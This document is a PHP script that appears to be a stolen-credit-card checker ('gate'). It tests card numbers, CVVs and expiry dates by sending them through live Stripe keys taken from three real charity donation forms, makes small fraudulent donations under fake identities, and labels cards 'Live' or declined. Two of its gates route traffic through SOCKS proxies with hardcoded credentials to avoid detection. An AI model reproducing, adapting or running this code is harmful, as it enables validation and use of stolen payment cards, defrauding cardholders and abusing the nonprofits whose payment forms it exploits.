<?php

class gate
{
    public function randstring()
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randstring = '';
        for ($i = 0; $i < 3; $i++) {
            $randstring = $characters[rand(0, strlen($characters))];
        }
        return $randstring;
    }
    public function bin_curl($cc)
    {
        $bin = substr($cc, 0, 6);
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://lookup.binlist.net/$bin");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        $result_bin = curl_exec($c);
        curl_close($c);
        $ident = json_decode($result_bin);
        $ccbank = (isset($ident->bank->name) ? strtoupper($ident->bank->name) : "Not Have Bank Name");
        $cctype = (isset($ident->type) ? strtoupper($ident->type) : "Not Have Type");
        $cclevel = (isset($ident->brand) ? strtoupper($ident->brand) : "Not Have Level");
        return $ccbank . " " . $cctype . " " . $cclevel;
    }
    public function gate_no_charge($cc, $month, $year, $cvv, $d, $bin)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[name]=Jeffrey+Sloan&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$month&card[exp_year]=$year&guid=c551601b-bf01-4493-af88-8d422f4a9eb0&muid=2709d0c3-33d1-4adb-9b62-d5c71b4eb16e&sid=7d156770-94b5-4cca-926b-5c900503bd21&pasted_fields=number&payment_user_agent=stripe.js%2F351abb7a%3B+stripe-js-v3%2F351abb7a&time_on_page=323430&referrer=https%3A%2F%2Fgreenshootsfoundation.org%2Fsupport-us%2Fstripe-payment-form-donations%2F&key=pk_live_cy6bL5ZVGZf7r7oR9HR6quQN");
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = 'Authority: api.stripe.com';
        $headers[] = 'Accept: application/json';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
        $headers[] = 'Dnt: 1';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Origin: https://js.stripe.com';
        $headers[] = 'Sec-Fetch-Site: same-site';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Referer: https://js.stripe.com/v3/controller-468bd62002596e10e873d190027981dd.html';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $api = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);

        $hasil = json_decode($api);
        $id = $hasil->id;
        if (isset($hasil->id)) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, 'https://greenshootsfoundation.org/wp-admin/admin-ajax.php');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "action=wp_full_stripe_inline_payment_charge&wpfs-form-name=GreenShootsDonations&wpfs-custom-amount-unique=1&wpfs-card-holder-name=Jeffrey+Sloan&wpfs-card-holder-email=gigolo3nd%40gmail.com&wpfs-custom-input%5B%5D=&wpfs-billing-address-line-1=692+Ann+place&wpfs-billing-address-line-2=asdasdasdasds&wpfs-billing-address-city=Milpitas&wpfs-billing-address-state=CA&wpfs-billing-address-zip=95035&wpfs-billing-address-country=US&wpfs-stripe-payment-method-id=$id");
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

            $headers = array();
            $headers[] = 'Authority: greenshootsfoundation.org';
            $headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
            $headers[] = 'Sec-Fetch-Dest: empty';
            $headers[] = 'X-Requested-With: XMLHttpRequest';
            $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
            $headers[] = 'Dnt: 1';
            $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
            $headers[] = 'Origin: https://greenshootsfoundation.org';
            $headers[] = 'Sec-Fetch-Site: same-origin';
            $headers[] = 'Sec-Fetch-Mode: cors';
            $headers[] = 'Referer: https://greenshootsfoundation.org/support-us/stripe-payment-form-donations/';
            $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5';
            $headers[] = 'Cookie: PHPSESSID=1c3da2d782ce8fc7598a8ca5c5b64601; _ga=GA1.2.1011651871.1586030993; _gid=GA1.2.347652439.1586030993; __stripe_sid=7d156770-94b5-4cca-926b-5c900503bd21; __stripe_mid=2709d0c3-33d1-4adb-9b62-d5c71b4eb16e';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close($ch);
            $final = json_decode($result);

            $Dead_text = "Your card was declined.";
            if (strpos($result, $Dead_text)) {
                $status = "Your card was declined.";
                $status_check = false;
            } else {
                $status = "Live";
                $status_check = true;
            }
        } else if ($hasil->error->code) {
            $status = $hasil->error->code;
            $status_check = false;
        }
        $array = ["data" => $d, "BIN" => $bin, "status" => $status, "status_check" => $status_check];
        return $array;
    }
    public function gate_1usd($cc, $month, $year, $cvv, $d, $bin)
    {
        $rand = $this->randstring();
        $proxy = array();
        $proxy[] = 'iad.socks.ipvanish.com';
        $proxy[] = 'dal.socks.ipvanish.com';
        $proxy[] = 'iad.socks.ipvanish.com';
        $proxy[] = 'chi.socks.ipvanish.com';
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_PROXYPORT, '1080');
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "7S3xIf6Hm:jhyxWzCOZ4S");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "email=gigolo3nd%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fpetition.trustthevote.org%2Fdonate%2F&pasted_fields=number&card[number]=$cc&card[exp_month]=$month&card[exp_year]=$year&card[cvc]=$cvv&card[name]=Jeffrey+Sloan&card[address_line1]=692+Ann+place%2C+asdasdasdasds&card[address_city]=Milpitas&card[address_state]=CA&card[address_zip]=95035&card[address_country]=United+States&time_on_page=14640&guid=c551601b-bf01-4493-af88-8d422f4a9eb0&muid=72b7f2b4-a444-49ea-aa04-4a4297976927&sid=71ed3da0-3f01-4f23-9a91-c7b3348d46b9&key=pk_live_nvKg6PObjC9y5Mm7rzOrOG7P");
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = 'Authority: api.stripe.com';
        $headers[] = 'Accept: application/json';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Accept-Language: en';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
        $headers[] = 'Dnt: 1';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Origin: https://checkout.stripe.com';
        $headers[] = 'Sec-Fetch-Site: same-site';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=6775d3e4-f7d8-1c6d-0783-e1a454316633';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $api = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);

        $hasil = json_decode($api);
        $id = $hasil->id;
        if (isset($hasil->id)) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, 'https://petition.trustthevote.org/charge');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXYPORT, '1080');
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "7S3xIf6Hm:jhyxWzCOZ4S");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "custom_amount=5&payplan=onetime&amountxfer=5&stripeEmail=gigolo3nd%40gmail.com&stripeToken=$id");
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

            $headers = array();
            $headers[] = 'Authority: petition.trustthevote.org';
            $headers[] = 'Cache-Control: max-age=0';
            $headers[] = 'Origin: https://petition.trustthevote.org';
            $headers[] = 'Upgrade-Insecure-Requests: 1';
            $headers[] = 'Dnt: 1';
            $headers[] = 'Content-Type: application/x-www-form-urlencoded';
            $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
            $headers[] = 'Sec-Fetch-Dest: iframe';
            $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'Sec-Fetch-Site: same-origin';
            $headers[] = 'Sec-Fetch-Mode: navigate';
            $headers[] = 'Sec-Fetch-User: ?1';
            $headers[] = 'Referer: https://petition.trustthevote.org/donate/';
            $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5';
            $headers[] = 'Cookie: __cfduid=d990d8222abf7edf7e569fbba9974fa791585793461; _ga=GA1.2.965046454.1585793458; __stripe_mid=a8b8507b-ee8e-40f3-978c-2bc7026d4fce; _gid=GA1.2.1996940909.1586157888; __stripe_sid=f14ece99-be92-4fe8-8b25-787e1221ee3b; _gat_gtag_UA_84553441_1=1';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close($ch);
            $final = json_decode($result);
            $Dead_text = "Sorry ... there was an error proccessing";
            $live_text = "Thank you";
            if (strpos($result, $Dead_text)) {
                $status = "Your credit card was decline";
                $status_check = false;
            } elseif (strpos($result, $live_text)) {
                $status = "Live";
                $status_check = false;
            }
        } elseif ($hasil->error->code) {
            $status = $hasil->error->message;
            $status_check = false;
        }
        $array = ["data" => $d, "BIN" => $bin, "status" => $status, "status_check" => $status_check];
        return $array;
    }
    public function gate_1($cc, $month, $year, $cvv, $d, $bin)
    {
        $rand = $this->randstring();
        $proxy = array();
        $proxy[] = 'iad.socks.ipvanish.com';
        $proxy[] = 'dal.socks.ipvanish.com';
        $proxy[] = 'iad.socks.ipvanish.com';
        $proxy[] = 'chi.socks.ipvanish.com';
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_PROXYPORT, '1080');
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "7S3xIf6Hm:jhyxWzCOZ4S");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$month&card[exp_year]=$year&guid=c551601b-bf01-4493-af88-8d422f4a9eb0&muid=f245f037-fc05-480d-9807-6c7851f1d69f&sid=0d443baa-ed6d-42a9-9a6c-8599b1454396&payment_user_agent=stripe.js%2F351abb7a%3B+stripe-js-v3%2F351abb7a&time_on_page=23711&referrer=https%3A%2F%2Fgamehistory.org%2Fdonate%2F&key=pk_live_lQ4NQtnhnc1N3zO1QFapEkbI&pasted_fields=number");
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = 'Authority: api.stripe.com';
        $headers[] = 'Accept: application/json';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
        $headers[] = 'Dnt: 1';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Origin: https://js.stripe.com';
        $headers[] = 'Sec-Fetch-Site: same-site';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Referer: https://js.stripe.com/v3/controller-468bd62002596e10e873d190027981dd.html';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $api = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        $hasil = json_decode($api);

        $Dead_text = "Oops!: Your card was declined.";
        $Dead_html = "Oops!: Invalid source object: must be a dictionary or a non-empty string. See API docs at https://stripe.com/docs";
        $live_text = "Thank you for your donation!";
        if (isset($hasil->id)) {
            $id = $hasil->id;
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, 'https://gamehistory.org/donate');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXYPORT, '1080');
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "7S3xIf6Hm:jhyxWzCOZ4S");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=once&amount=10&custom-amount=&fname=Jeffrey&lname=Sloan&email=gigolo3nd%40gmail.com&message=&token=$id");
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

            $headers = array();
            $headers[] = 'Authority: gamehistory.org';
            $headers[] = 'Cache-Control: max-age=0';
            $headers[] = 'Origin: https://gamehistory.org';
            $headers[] = 'Upgrade-Insecure-Requests: 1';
            $headers[] = 'Dnt: 1';
            $headers[] = 'Content-Type: application/x-www-form-urlencoded';
            $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
            $headers[] = 'Sec-Fetch-Dest: document';
            $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'Sec-Fetch-Site: same-origin';
            $headers[] = 'Sec-Fetch-Mode: navigate';
            $headers[] = 'Sec-Fetch-User: ?1';
            $headers[] = 'Referer: https://gamehistory.org/donate/';
            $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5';
            $headers[] = 'Cookie: __stripe_sid=0d443baa-ed6d-42a9-9a6c-8599b1454396; __stripe_mid=f245f037-fc05-480d-9807-6c7851f1d69f';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close($ch);
            if (strpos($result, $Dead_text)) {
                $status = "Oops!: Your card was declined.";
                $status_check = false;
            } elseif (strpos($result, $Dead_html)) {
                $status = "Oops!: Your card was declined.";
                $status_check = false;
            } elseif (strpos($result, $live_text)) {
                $status = "Live";
                $status_check = true;
            }
        } elseif ($hasil->error->code) {
            $status = $hasil->error->message;
            $status_check = false;
        }
        $array = ["data" => $d, "BIN" => $bin, "status" => $status, "status_check" => $status_check];
        return $array;
    }
}
